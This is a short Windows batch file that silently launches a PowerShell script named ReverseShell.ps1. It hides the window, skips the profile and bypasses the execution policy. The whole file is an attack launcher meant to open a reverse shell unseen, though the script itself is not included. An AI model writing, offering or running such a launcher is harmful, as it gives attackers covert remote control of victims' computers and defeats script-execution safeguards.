@echo off
powershell -WindowStyle Hidden -Command "& {Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File \"ReverseShell.ps1\"' -WindowStyle Hidden}"
